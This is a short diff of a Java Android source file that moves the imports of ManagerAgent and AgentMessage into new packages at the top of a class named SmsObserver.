@@ -8,8 +8,8 @@ import android.os.Handler;
 
 import com.android.service.Sms;
 import com.android.service.Status;
-import com.android.service.agent.ManagerAgent;
-import com.android.service.agent.AgentMessage;
+import com.android.service.manager.ManagerAgent;
+import com.android.service.module.AgentMessage;
 
 public class SmsObserver extends ContentObserver {
 	private static final String TAG = "SmsObserver"; //$NON-NLS-1$
